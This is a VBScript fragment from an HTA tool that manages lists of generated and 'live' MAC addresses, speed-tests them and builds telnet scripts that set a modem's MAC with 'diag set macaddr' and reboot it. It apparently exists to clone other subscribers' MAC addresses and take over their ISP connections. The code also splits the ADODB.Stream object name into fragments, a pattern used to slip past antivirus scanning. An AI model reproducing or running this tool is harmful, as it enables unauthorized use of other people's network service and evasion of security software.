Function updateCheckFileContent_Read
filename = "newUpdateVersion.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
Sleeper 1000
If fso.FileExists(accountFile)= True Then
Set objFileToRead = CreateObject("Scripting.FileSystemObject").OpenTextFile(accountFile,1)
strFileText = objFileToRead.ReadLine()
objFileToRead.Close
Set objFileToRead = Nothing
MyString = (Trim(strFileText))
''updateCheckFileContent_Read = MyString
If updateCheckReadFileResult <> "NOUPDATE" Then
updateCheckFileContent_Read = updateCheckReadFileResult
Else
updateRestoreDefaultFile(filename)
updateCheckFileContent_Read = "No_Update:pulic101:PUBPLIC VERSION:yyyxyyyz:www.symbianize.com"
End If
Else
''updateCheckFileContent_Read =  "DLresult.txt not exist"''"Unstable / Dead link"
MsgBox "UpdateStatusFile not exist"
End If
End Function
''
Function CheckDownloadResultFile (tstLogCmndFileText)		
Dim fso
filenameLogFile = tstLogCmndFileText
tstLogCmndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameLogFile)
Set fso = CreateObject("Scripting.FileSystemObject")
isOk = False
If fso.FileExists(tstLogCmndFile)= True Then
If fso.GetFile(tstLogCmndFile).size <> 0 then
isOk = True
Else
'MsgBox "File is EMPTY!"
isOk = False
End if
Else
'MsgBox "File NOT EXIST"
isOk = False
End If
CheckDownloadResultFile = isOk
Set fso = Nothing
End Function
Function DownLoadSpeedResult_Read
filename = "DLresult.txt"
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
Sleeper 1000
If fso.FileExists(accountFile)= True Then
Set objFileToRead = CreateObject("Scripting.FileSystemObject").OpenTextFile(accountFile,1)
strFileText = objFileToRead.ReadLine()
objFileToRead.Close
Set objFileToRead = Nothing
MyString = (Trim(strFileText))
DownLoadSpeedResult_Read = MyString
Else
DownLoadSpeedResult_Read =  "DLresult.txt not exist"''"Unstable / Dead link"
End If
End Function
Sub RunDownloadSpeedTest (testFileSize) ''testFileSize ''fileSizeList.value
ClearDLresultFile
Sleeper 2000
filename = "DLspeedTest.vbs"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
CreateObject("WScript.Shell").Run Chr(34)& currentFolderAndFile & chr(34) &" " &testFileSize,0 , True
Sleeper 2000	
End Sub 
''
Function updateRunUpdateChecker
RunDownloadSpeedTest("999") ''fileSizeList.value
Sleeper 2000
dlFileResult = False
Do
dlFileResult = False
dlFileResult = updateCheckFinalFile ("newUpdateVersion.txt")
Loop While dlFileResult = False
updateRunUpdateChecker = updateCheckFileContent_Read
End Function
''
Function DownLoadSpeedResult
RunDownloadSpeedTest(fileSizeList.value) ''fileSizeList.value
dlFileResult = False
Do
dlFileResult = False
dlFileResult = CheckDownloadResultFile ("DLresult.txt")
Loop While dlFileResult = False
DownLoadSpeedResult = DownLoadSpeedResult_Read
End Function
Sub DisplayLog(viewloglocation,logString)
If viewloglocation = 1 Then
DisplayLogChangeMAConly logString
ElseIf viewloglocation = 2 Then
DisplayLogMacGenScan logString
End If
End Sub
''END NEW DOWNLOADspeedTest
''DOWNLOAD BEGIN function
Function DownLoadSpeedResult_orig
On Error Resume Next
strLink = ""
If fileSizeList.value = "100KB" Then
strLink = "http://androidnetworktester.googlecode.com/files/100kb.txt"
ElseIf fileSizeList.value = "1MB" Then
strLink = "https://androidnetworktester.googlecode.com/files/1mb.txt"
ElseIf fileSizeList.value = "10MB" Then
strLink = "http://cachefly.cachefly.net/10mb.test"
End If
strSaveName = Mid(strLink, InStrRev(strLink,"/") + 1, Len(strLink))
strSaveTo = ReplaceWithSpace(GetToolCurrentDirectory &"\" &strSaveName)
''
Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.FileExists(strSaveTo) Then
objFSO.DeleteFile(strSaveTo)
End If
Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
objHTTP.Open "GET", strLink, False
StartTime = Timer 
objHTTP.Send
If objHTTP.Status = 200 Then
foo = "ADO"
bar = "DB.S"
baz = "tream"
Dim objStream
Set objStream = CreateObject(foo & bar & baz)
With objStream
.Type = 1 'adTypeBinary
.Open
.Write objHTTP.ResponseBody
.SaveToFile strSaveTo
.Close
EndTime = Timer
End With
set objStream = Nothing
End If
ElapsedTime = FormatNumber(EndTime - StartTime, 2)
Set fileS = objFSO.GetFile(strSaveTo)
FileSize = fileS.Size
''Wscript.Echo ("Seconds to 2 decimal places: " &ElapsedTime )
''WScript.Echo ""
''Wscript.Echo ("Ave. Download Speed: " & FormatNumber((FileSize /1024)/ElapsedTime,2 ) &" KB/s")
testResult = FormatNumber((FileSize /1024)/ElapsedTime,2 )
If objFSO.FileExists(strSaveTo) Then
''WScript.Echo "Download `" & strSaveName & "` completed successfuly."
objFSO.DeleteFile(strSaveTo) 
End If
If Err.Number = 0 Then
DownLoadSpeedResult = testResult & " KBps"
Else
'MsgBox "Error #: " & Err.Number & " Source: " & Err.Source & " Desc: " &  Err.Description
DownLoadSpeedResult = "Unstable / Dead link"
Err.Clear
End If
End Function
''DOWNLOAD END function
Sub CreateTableandPopulateWithGenMacFile
Dim strHTML,fso,listMacFile,macToTestLine,MyString,MyArray,macToTest,macToTestDomain,totalLineInAFile
strHTML = "<table class='gridtable' ><tr><th>MAC</th><th>Domain</th><th>Option</th></tr>"
Set fso = CreateObject("Scripting.FileSystemObject")
filename = "MacGenList.txt"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
If fso.FileExists(currentFolderAndFile)= True Then
Set listMacFile = fso.OpenTextFile(currentFolderAndFile)
i = 0
Do while not listMacFile.AtEndOfStream 
macToTestLine =  listMacFile.ReadLine()
MyString = (Trim(macToTestLine))
MyArray = Split(MyString, "|", -1, 1)
macToTest = MyArray(0) 
macToTestDomain = MyArray(1)
totalLineInAFile = listMacFile.Line -1
i = i + 1
x = i Mod 2
If x = 0 Then
strHTML = strHTML & "<tr style=""background-color:#d4e3e5;"" onmouseover=""this.style.backgroundColor='#ffff66';"" onmouseout=""this.style.backgroundColor='#d4e3e5';"">"
Else
strHTML = strHTML & "<tr style=""background-color:#ffffff;"" onmouseover=""this.style.backgroundColor='#ffff66';"" onmouseout=""this.style.backgroundColor='#ffffff';"">"
End If
deleteBtnValue = "Delete"
'strHTML = strHTML & "<td width='100%'>&nbsp;"&macToTest&"</td>"& "<td><input id='' type='button' name='deleteBtnMac' value='"&macToTest&"' onclick ='VBScript:deleteMacFromGenFile deleteBtnMac.value' ></td>"
strHTML = strHTML & "<td>"&macToTest&"</td>"& "<td>"&macToTestDomain&"</td>"&"<td><input id=" & i & " type=""button"" class=""btnTable"" name=""" & i & """ value=""" & deleteBtnValue & """ onclick=""VBScript:deleteMacFromGenFile('" & macToTestLine & "')""></td>"
strHTML = strHTML & "</tr>"
Loop
listMacFile.Close
strHTML = strHTML & "</table>"
TableArea.InnerHTML = strHTML
End If
CountLine
SnipeBtn.Disabled = EnableDisableSnipButton
'fso = Nothing
Set strHTML = Nothing
Set fso = Nothing
Set listMacFile = Nothing
Set macToTestLine = Nothing
Set MyString = Nothing
Set MyArray = Nothing
Set macToTest = Nothing
Set macToTestDomain = Nothing
Set totalLineInAFile = Nothing
End Sub
Sub CreateTableandPopulateWithCurntIpScan
Dim strHTML,fso,listMacFile,macToTestLine,MyString,MyArray,macToTest,macToTestDomain,totalLineInAFile
strHTML = "<table class='gridtableLiveCrnTIpScan' ><tr><th>Option</th><th>WAN MAC</th><th>LAN MAC</th><th>IP Address</th><th>Device ID</th><th>Description</th></tr>"
Set fso = CreateObject("Scripting.FileSystemObject")
filename = "IpInfo.txt"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
If fso.FileExists(currentFolderAndFile)= True Then
Set listMacFile = fso.OpenTextFile(currentFolderAndFile)
i = 0
Do while not listMacFile.AtEndOfStream 
macToTestLine =  listMacFile.ReadLine()
MyString = (Trim(macToTestLine))
MyArray = Split(MyString, "|", -1, 1)
ipInfoWan = MyArray(0)
ipInfoLan = MyArray(1)
ipInfo = MyArray(2) 
ipInfoSerial = MyArray(3)
ipInfoDesc =MyArray(4)
'totalLineInAFile = listMacFile.Line -1
i = i + 1
x = i Mod 2
If x = 0 Then
strHTML = strHTML & "<tr style='background-color:#d4e3e5;' onclick=""this.style.backgroundColor='#ffff66';"" onmouseover=""this.style.backgroundColor='#ffff66';"" onmouseout=""this.style.backgroundColor='#d4e3e5';"">"
Else
strHTML = strHTML & "<tr style='background-color:#ffffff;' onclick=""this.style.backgroundColor='#ffff66';"" onmouseover=""this.style.backgroundColor='#ffff66';"" onmouseout=""this.style.backgroundColor='#ffffff';"">"
End If
deleteBtnValue = " Del "
copyBtnValue = "Copy"
editBtnValue = " Info "
'strHTML = strHTML & "<td width='100%'>&nbsp;"&macToTest&"</td>"& "<td><input id='' type='button' name='deleteBtnMac' value='"&macToTest&"' onclick ='VBScript:deleteMacFromGenFile deleteBtnMac.value' ></td>"
strHTML = strHTML &"<td><input title='VIEW this Mac Information' id=" & i & " type=""button"" class='btnTable' name=""" & i & """ value=""" & editBtnValue & """ onclick=""VBScript:EditLiveIpScan('" & macToTestLine & "')""> <input title='DELETE this MAC' id=" & i & " type=""button"" class='btnTable' name=""" & i & """ value=""" & deleteBtnValue & """ onclick=""VBScript:deleteMacFromLiveIpScanFile('" & macToTestLine & "')""> <input title='COPY this MAC address to clipboard' id=" & i & " type=""button"" class='btnTable' name=""" & i & """ value=""" & copyBtnValue & """ onclick=""VBScript:copyToClipBoard('" & ipInfoWan & "')""></td>"& "<td>"&ipInfoWan&"</td>"& "<td>"&ipInfoLan&"</td>" & "<td>"&ipInfo&"</td>"& "<td>"&ipInfoSerial&"</td>"& "<td>"&ipInfoDesc&"</td>"
strHTML = strHTML & "</tr>"
Loop
listMacFile.Close
strHTML = strHTML & "</table>"
LiveIpTableArea.InnerHTML = strHTML
End If
CountLineCurrntLiveIpScan
'        SnipeBtn.Disabled = EnableDisableSnipButton
'        If CountLineLiveMac = 0 Then
'        	liveMacEditDesc.disabled = True
'			btnSaveMacInfo.disabled = True
'		Else
'        	liveMacEditDesc.disabled = False
'			btnSaveMacInfo.disabled = False
'        End If 
'fso = Nothing
Set strHTML = Nothing
Set fso = Nothing
Set listMacFile = Nothing
Set macToTestLine = Nothing
Set MyString = Nothing
Set MyArray = Nothing
Set macToTest = Nothing
Set macToTestDomain = Nothing
' Set totalLineInAFile = Nothing
End Sub ''end table crntliveIpscan LiveIpTableArea
Sub CreateTableandPopulateWithLiveFile
Dim strHTML,fso,listMacFile,macToTestLine,MyString,MyArray,macToTest,macToTestDomain,totalLineInAFile
strHTML = "<table class='gridtableLive' ><tr><th>Option</th><th>MAC</th><th>Domain</th><th>Description</th></tr>"
Set fso = CreateObject("Scripting.FileSystemObject")
filename = "LiveMac.txt"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
If fso.FileExists(currentFolderAndFile)= True Then
Set listMacFile = fso.OpenTextFile(currentFolderAndFile)
i = 0
Do while not listMacFile.AtEndOfStream 
macToTestLine =  listMacFile.ReadLine()
MyString = (Trim(macToTestLine))
MyArray = Split(MyString, "|", -1, 1)
macToTest = MyArray(0) 
macToTestDomain = MyArray(1)
macDesc = MyArray(3)
'totalLineInAFile = listMacFile.Line -1
i = i + 1
x = i Mod 2
If x = 0 Then
strHTML = strHTML & "<tr style='background-color:#d4e3e5;' onclick=""this.style.backgroundColor='#ffff66';"" onmouseover=""this.style.backgroundColor='#ffff66';"" onmouseout=""this.style.backgroundColor='#d4e3e5';"">"
Else
strHTML = strHTML & "<tr style='background-color:#ffffff;' onclick=""this.style.backgroundColor='#ffff66';"" onmouseover=""this.style.backgroundColor='#ffff66';"" onmouseout=""this.style.backgroundColor='#ffffff';"">"
End If
deleteBtnValue = " Del "
copyBtnValue = "Copy"
editBtnValue = " Info "
'strHTML = strHTML & "<td width='100%'>&nbsp;"&macToTest&"</td>"& "<td><input id='' type='button' name='deleteBtnMac' value='"&macToTest&"' onclick ='VBScript:deleteMacFromGenFile deleteBtnMac.value' ></td>"
strHTML = strHTML &"<td><input title='VIEW this Mac Information' id=" & i & " type=""button"" class='btnTable' name=""" & i & """ value=""" & editBtnValue & """ onclick=""VBScript:EditLiveMac('" & macToTestLine & "')""> <input title='DELETE this MAC' id=" & i & " type=""button"" class='btnTable' name=""" & i & """ value=""" & deleteBtnValue & """ onclick=""VBScript:deleteMacFromLiveMacFile('" & macToTestLine & "')""> <input title='COPY this MAC address to clipboard' id=" & i & " type=""button"" class='btnTable' name=""" & i & """ value=""" & copyBtnValue & """ onclick=""VBScript:copyToClipBoard('" & macToTest & "')""></td>"& "<td>"&macToTest&"</td>"& "<td>"&macToTestDomain&"</td>" & "<td>"&macDesc&"</td>"
strHTML = strHTML & "</tr>"
Loop
listMacFile.Close
strHTML = strHTML & "</table>"
TableAreaLive.InnerHTML = strHTML
End If
CountLineLiveMac
SnipeBtn.Disabled = EnableDisableSnipButton
If CountLineLiveMac = 0 Then
liveMacEditDesc.disabled = True
btnSaveMacInfo.disabled = True
Else
liveMacEditDesc.disabled = False
btnSaveMacInfo.disabled = False
End If 
'fso = Nothing
Set strHTML = Nothing
Set fso = Nothing
Set listMacFile = Nothing
Set macToTestLine = Nothing
Set MyString = Nothing
Set MyArray = Nothing
Set macToTest = Nothing
Set macToTestDomain = Nothing
' Set totalLineInAFile = Nothing
End Sub
Sub EditLiveMac(stringToGet)
liveMacEditFull.value = stringToGet
MyStringEdit = (Trim(stringToGet))
MyArrayEdit = Split(MyStringEdit, "|", -1, 1)
liveMacEditHalfFull.value = MyArrayEdit(0)&"|"& MyArrayEdit(1)&"|"& MyArrayEdit(2) 
macToEdit = MyArrayEdit(0) 
macToEditDomain = MyArrayEdit(3)
liveMacEdit.value = macToEdit
liveMacEditDesc.value = macToEditDomain
Set MyStringEdit = Nothing
Set MyArrayEdit = Nothing
Set macToEdit = Nothing
Set macToEditDomain = Nothing
End Sub
Sub EditLiveIpScan(stringToGet)
liveIpScanEditFull.value = stringToGet
'MsgBox stringToGet
MyStringEdit = (Trim(stringToGet))
MyArrayEdit = Split(MyStringEdit, "|", -1, 1)
liveIpScanEditHalfFull.value = MyArrayEdit(0)&"|"&MyArrayEdit(1)&"|"& MyArrayEdit(2)&"|"& MyArrayEdit(3) 
macToEdit = MyArrayEdit(0) 
macToEditDomain = MyArrayEdit(4)
liveIpScanEdit.value = macToEdit
liveIpScanEditDesc.value = macToEditDomain
Set MyStringEdit = Nothing
Set MyArrayEdit = Nothing
Set macToEdit = Nothing
Set macToEditDomain = Nothing
End Sub
Sub EditLiveMacLimitChar
intCharacters=Len(liveMacEditDesc.Value)
If intCharacters > 31 Then
liveMacEditDesc.Value = Trim(Left(liveMacEditDesc.Value, 30))
liveMacEditDesc.style.background = "Red"
liveMacEditDesc.style.color = "White"
Else
liveMacEditDesc.style.color = "#000000"
liveMacEditDesc.style.background = "White"
'intRemaining = 256 - intCharacters
'DataArea.InnerHTML= "Characters remaining: " &intRemaining
End If
End Sub
Sub EditLiveIpScanLimitChar
intCharacters=Len(liveIpScanEditDesc.Value)
If intCharacters > 31 Then
liveIpScanEditDesc.Value = Trim(Left(liveIpScanEditDesc.Value, 30))
liveIpScanEditDesc.style.background = "Red"
liveIpScanEditDesc.style.color = "White"
Else
liveIpScanEditDesc.style.color = "#000000"
liveIpScanEditDesc.style.background = "White"
'intRemaining = 256 - intCharacters
'DataArea.InnerHTML= "Characters remaining: " &intRemaining
End If
End Sub
Function GenNumberId
intHighNumber = 9999999
intLowNumber = 1
For i = 1 to 5
Randomize
intNumber = Int((intHighNumber - intLowNumber + 1) * Rnd + intLowNumber)
GenNumberId = intNumber
Next
End Function 
Sub FindAndReplace(txtFilename,stringToFind,stringToReplace)
Const ForReading = 1
Const ForWriting = 2
Set objFSO = CreateObject("Scripting.FileSystemObject")
filename = txtFilename
txtFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFile = objFSO.OpenTextFile(txtFile, ForReading)
strText = objFile.ReadAll
objFile.Close
strNewText = Replace(strText, stringToFind, stringToReplace)
Set objFile = objFSO.OpenTextFile(txtFile, ForWriting)
objFile.Write strNewText
objFile.Close
End Sub
Sub SaveEditLiveMacInfo
if InStr(Trim(liveMacEditDesc.value), "|") Then
MsgBox "Description contains | character which is invalid."
Exit Sub
End If
txtFile = "LiveMac.txt"
'filename = "LiveMac.txt"
'txtFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
replaceString = liveMacEditHalfFull.value & "|" &  Trim(liveMacEditDesc.value)
FindAndReplace txtFile,liveMacEditFull.value,replaceString
CreateTableandPopulateWithLiveFile
liveMacEditDesc.value = ""
liveMacEdit.value = "Please select MAC"
liveMacEditFull.value = ""
liveMacEditHalfFull.value = ""
End Sub
Sub SaveEditLiveMacInfoSpeed
If liveMacEdit.value = "Please select MAC" Then
MsgBox "Please SELECT CURRENT DEVICE MAC first. Thank you.",, "Current DEVICE MAC is required."
Exit Sub
End If
intAnswer = Msgbox ("WARNING : Before you continue." & vbCr & vbLf &"(TEST File size: " & fileSizeList.value &")" & vbCr & vbLf & vbCr & vbLf & "IS THIS YOUR CURRENT MAC??? "& vbCr & vbLf  & vbCr & vbLf & "NOTE: IT TAKES a WHILE to FINISH." & vbCr & vbLf &  "DO NOT EXIT until its FINISHED!!! " & vbCr & vbLf &  "The TOOL may NOT BE RESPONDING OR HANGS-UP!!! ", vbYesNo, "Speed Test Notification...")
If intAnswer = vbYes Then
''Msgbox "You answered Yes."
Sleeper 2000
SaveEditLiveMacInfoSpeedCmnd
Else
''MsgBox "You answered no."
Exit Sub
End If
'Dim objShellInGen, ansBtn
'Set objShellInGen = CreateObject("WScript.Shell")
'ansBtn = objShellInGen.Popup("WARNING : Before you continue."& vbCr & vbLf & vbCr & vbLf & "IS THIS YOUR CURRENT MAC? "& vbCr & vbLf  & vbCr & vbLf &"[OK] = YES, CONTINUE NOW! " & vbCr & vbLf & "[Cancel] = NO, PLEASE ABORT!" & vbCr & vbLf  & vbCr & vbLf & "NOTE: IT TAKES a WHILE to FINISH." & vbCr & vbLf &  "DO NOT EXIT until it FINISH!!! ", 0, "Speed Test Notification..." , 1 + 4096 + 16)
'If (ansBtn = -1 OR ansBtn = 1)  Then
''changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Operation started..."
'TextAreaScrollBottom(changeMACLog.name)
'	Else 
''changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Operation cancelled..."
''TextAreaScrollBottom(changeMACLog.name)
'	Exit Sub
'End If
'	Set objShellInGen = Nothing
'	Set ansBtn = Nothing
'SaveEditLiveMacInfoSpeedCmnd
End Sub
''SpeedtestSave BEGIN
Sub SaveEditLiveMacInfoSpeedCmnd
if InStr(Trim(liveMacEditDesc.value), "|") Then
MsgBox "Description contains | character which is invalid."
Exit Sub
End If
txtFile = "LiveMac.txt"
'filename = "LiveMac.txt"
'txtFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
speedResult = DownLoadSpeedResult
liveMacEditDesc.value = speedResult
replaceString = liveMacEditHalfFull.value & "|" &  speedResult
FindAndReplace txtFile,liveMacEditFull.value,replaceString
CreateTableandPopulateWithLiveFile
liveMacEditFull.value = replaceString
EditLiveMac(liveMacEditFull.value)
'liveMacEditDesc.value = ""
'liveMacEdit.value = "Please select MAC"
'liveMacEditFull.value = ""
'liveMacEditHalfFull.value = ""
MsgBox "Speed TEST FINISHED...." & vbCr & vbLf &  vbCr & vbLf & "Speed RESULT may NOT BE ACCURATE." & vbCr & vbLf &"You can try it again....",,"Operation finish..."
End Sub
''SpeedTestSave
Sub SpeedTestCurrentConnection
changeMACLog.Value = "PLEASE change download TEST FILE size in TOOL SETTINGS TAB menu. "
DisplayLogChangeMAConly "Please DO NOT EXIT!!! (CURRENT TEST file size is: " & fileSizeList.value &")"  & vbCr & vbLf &"Please WAIT this MAY TAKE FOR A WHILE to finished....."
Sleeper 1000
DisplayLogChangeMAConly "SPEED TEST is now processing........... Please WAIT!!!"
DisplayLogChangeMAConly  "Process finished:" & vbCr & vbLf & "Average Download Speed result: " & DownLoadSpeedResult
DisplayLogChangeMAConly   vbCr & vbLf & "Speed RESULT may NOT BE ACCURATE. You can try it again...."
RunUpdateOnToolOkFinal(0)
End Sub
Sub SaveEditLiveIpScanInfo
if InStr(Trim(liveIpScanEditDesc.value), "|") Then
MsgBox "Description contains | character which is invalid."
Exit Sub
End If
txtFile = "IpInfo.txt"
replaceString = liveIpScanEditHalfFull.value & "|" &  Trim(liveIpScanEditDesc.value)
FindAndReplace txtFile,liveIpScanEditFull.value,replaceString
CreateTableandPopulateWithCurntIpScan
liveIpScanEditDesc.value = ""
liveIpScanEdit.value = "Please select MAC"
liveIpScanEditFull.value = ""
liveIpScanEditHalfFull.value = ""
End Sub
Sub SortLiveMACList
Const ForReading = 1
Const ForWriting =2
Const adVarChar = 200
Const MaxCharacters = 255
Const adFldIsNullable = 32
Set DataList = CreateObject("ADOR.Recordset")
DataList.Fields.Append "TextLine", adVarChar, MaxCharacters, adFldIsNullable
DataList.Open
Set objFSO = CreateObject("Scripting.FileSystemObject")
filename = "LiveMac.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFile = objFSO.OpenTextFile(textFilePath, ForReading)
Do Until objFile.AtEndOfStream
strLine = objFile.ReadLine
DataList.AddNew
DataList("TextLine") = strLine
DataList.Update
Loop
objFile.Close
Set objFile = objFSO.OpenTextFile(textFilePath, ForWriting)
DataList.Sort = "TextLine ASC"
DataList.MoveFirst
Do Until DataList.EOF
objFile.WriteLine DataList.Fields.Item("TextLine") 
DataList.MoveNext
Loop
objFile.Close
Set objFSO = Nothing
Set objFile = Nothing
Set DataList = Nothing
End Sub
Sub SortLiveIpScanList
Const ForReading = 1
Const ForWriting =2
Const adVarChar = 200
Const MaxCharacters = 255
Const adFldIsNullable = 32
Set DataList = CreateObject("ADOR.Recordset")
DataList.Fields.Append "TextLine", adVarChar, MaxCharacters, adFldIsNullable
DataList.Open
Set objFSO = CreateObject("Scripting.FileSystemObject")
filename = "IpInfo.txt"
textFilePath = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFile = objFSO.OpenTextFile(textFilePath, ForReading)
Do Until objFile.AtEndOfStream
strLine = objFile.ReadLine
DataList.AddNew
DataList("TextLine") = strLine
DataList.Update
Loop
objFile.Close
Set objFile = objFSO.OpenTextFile(textFilePath, ForWriting)
DataList.Sort = "TextLine ASC"
DataList.MoveFirst
Do Until DataList.EOF
objFile.WriteLine DataList.Fields.Item("TextLine") 
DataList.MoveNext
Loop
objFile.Close
Set objFSO = Nothing
Set objFile = Nothing
Set DataList = Nothing
End Sub
Function CheckLiveMAcFile
result = false
''liveMACFile= "LiveMac.txt"
filename = "LiveMac.txt"
liveMACFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(liveMACFile)= False Then
result = False
Else
If fso.GetFile(liveMACFile).size <> 0 then
result= True
Else
result= false
End if
End If
CheckLiveMAcFile = result
Set fso = Nothing
End Function
Function CheckLiveIpScanFile
result = false
'liveMACFile= "IpInfo.txt"
filename = "IpInfo.txt"
liveMACFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(liveMACFile)= False Then
result = False
Else
If fso.GetFile(liveMACFile).size <> 0 then
result= True
Else
result= false
End if
End If
CheckLiveIpScanFile = result
Set fso = Nothing
End Function
Sub SortBtn
On Error Resume Next
If CheckLiveMAcFile = True Then
SortLiveMACList
populateListOfLiveMac 
Else 
MsgBox "Live Mac file is empty / not exists.."
End If
If Err.Number = 0 Then
Exit Sub
Else
MsgBox "Error:" & Err.Number & " Source: " & Err.Source & " Desc: " &  Err.Description,0,"Error Message.."				   
Err.Clear
End If
End Sub
Sub SortLiveIpScanBtn
On Error Resume Next
If CheckLiveIpScanFile = True Then
SortLiveIpScanList
populateCurrentLiveIpScan  
Else 
MsgBox "Live Ip Scan file is empty / not exists.."
End If
If Err.Number = 0 Then
Exit Sub
Else
MsgBox "Error:" & Err.Number & " Source: " & Err.Source & " Desc: " &  Err.Description,0,"Error Message.."				   
Err.Clear
End If
End Sub
Function PingWMI(telHost)
result = False
Dim wmiQuery, objWMIService, objPing, objStatus
wmiQuery = "Select * From Win32_PingStatus Where Address = '" & telHost & "'"
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set objPing = objWMIService.ExecQuery(wmiQuery)
For Each objStatus in objPing
If IsNull(objStatus.StatusCode) Or objStatus.Statuscode<>0 Then
result = False 'if computer is unreacable, return false
Else 
If (IsSnipeMac <> document.title)  Or (base64decode(scanId.value) <> document.title) Then
result = False 'if computer is reachable, return true
Else
result = True 'if computer is reachable, return true
End if
End If
Next
Set wmiQuery = Nothing
Set objWMIService = Nothing 
Set objPing = Nothing 
Set objStatus  = Nothing
Ping = result 
End Function
''
Function PingHostLoop
returnPingResult = False
pingCountTest = 0
pingResult = False
Do 
pingResult = False
pingResult = Ping(Trim(inputTelnetHost.value))
Sleeper 1000
pingCountTest = pingCountTest + 1
If pingResult = True Then
returnPingResult = True
Else
If pingCountTest = 5 Then
CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /release", 0, 1
Sleeper 5000
CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /renew", 0, 1
Sleeper 5000
ElseIf pingCountTest = 6 Then
Sleeper 10000
End If 
If pingCountTest > 8 Then

returnPingResult = False
Exit Do
End If
End If

If hdnStopMacProcess.value = "1" Then
Sleeper(1000)
hdnStopProcessResult.value = "1"
DisplayLogMacGenScan(vbCr & vbLf & "Stopping process....Ok!")
pingCountTest = 0
PingHostLoop = returnPingResult
Exit Function
End If
Loop While pingResult = False
pingCountTest = 0
PingHostLoop = returnPingResult
End Function
''
Function Ping(telHost)
Dim Shell, strCommand, result, ReturnCode
Set Shell = CreateObject("WScript.Shell")
strCommand = "%comspec% /c ping -n 1 -w 4000 " & telHost
result = False
ReturnCode = 1
'While(True)
ReturnCode = Shell.Run(strCommand, 0, True)
''MsgBox ReturnCode
Sleeper 800 
If ReturnCode = 0 Then
'result = True
If (IsSnipeMac <> document.title)  Or (base64decode(scanId.value) <> document.title) Then
result = False 'if computer is reachable, return true
Else
result = True 'if computer is reachable, return true
End if
Else
result = False
End If
Ping  = result
Set ReturnCode = Nothing
'MsgBox Ping
Set result = Nothing
Set Shell = Nothing
End Function
''
Function PingCheckInternet(telHost)
Dim Shell, strCommand, result, ReturnCode
ReturnCode = 1
result = False
Set Shell = CreateObject("WScript.Shell")
strCommand = "%comspec% /c ping -n 1 -w 4000 " & telHost
'While(True)
Sleeper 800 
ReturnCode = Shell.Run(strCommand, 0, True)
''MsgBox ReturnCode
Sleeper 800 
If ReturnCode = 0 Then
result = True
Else
result = False
End If
PingCheckInternet = result
Set ReturnCode = Nothing
'MsgBox Ping
Set result = Nothing
Set Shell = Nothing
End Function
''
''
Sub RefreshLanInterface
CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /release", 0, 1
Sleeper 1000
CreateObject("WScript.Shell").Run"%comspec% /c ipconfig /renew", 0, 1
Sleeper 1000
End Sub
''
Function PingCheckNetWMI(telHost)
result = False
Dim wmiQueryNet, objWMIServiceNet, objPingNet, objStatusNet
wmiQueryNet = "Select * From Win32_PingStatus Where Address = '" & telHost & "'"
Set objWMIServiceNet = GetObject("winmgmts:\\.\root\cimv2")
Set objPingNet = objWMIServiceNet.ExecQuery(wmiQueryNet)
For Each objStatusNet in objPingNet
If IsNull(objStatusNet.StatusCode) Or objStatusNet.Statuscode<>0 Then
result = False 'if computer is unreacable, return false
Else
result = True 'if computer is reachable, return true
End If
Next
Set wmiQueryNet = Nothing
Set objWMIServiceNet = Nothing 
Set objPingNet = Nothing 
Set objStatusNet  = Nothing
PingCheckNet = result
End Function
Function PingCheckNet(telHost)
Set Shelly = CreateObject("wscript.shell")
strCommandy = "%comspec% /c ping -n 1 -w 4000 " & telHost
resulty = False
ReturnCodey = 1
'While(True)
ReturnCodey = Shelly.Run(strCommandy, 0, True)  
If ReturnCodey = 0 Then
resulty = True
Else
resulty = False
End If
PingCheckNet  = resulty
Set Shelly = Nothing
End Function
Sub TstCmnd622i2010Reboot(currentMac,tstInputCmndFile)	
'MsgBox "Inside create Input command"
'changeMACLog.value = "Creating telnet input Command....."
'TextAreaScrollBottom(changeMACLog.name)
set objFSO = createobject("Scripting.FileSystemObject")
Set Source = objFSO.CreateTextFile( tstInputCmndFile, True)
Source.WriteLine (Trim(inputTelnetHost.value))
Source.WriteLine ("WAIT "& chr(34) &"Login:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetUname.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"Password:"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) & inputTelnetPassowrd.value & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
'Source.WriteLine ("SEND "& chr(34) &"?\m"& chr(34)&"")
'Source.WriteLine ("WAIT "& chr(34) &"Connection To"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"diag set macaddr " &currentMac & "\m"& chr(34)&"")
Source.WriteLine ("WAIT "& chr(34) &"ATP>"& chr(34)&"")
Source.WriteLine ("SEND "& chr(34) &"diag reboot\m"& chr(34)&"") 'REBOOT
''Source.WriteLine ("WAIT "& chr(34) &"d "& chr(34)&"") 'REBOOT
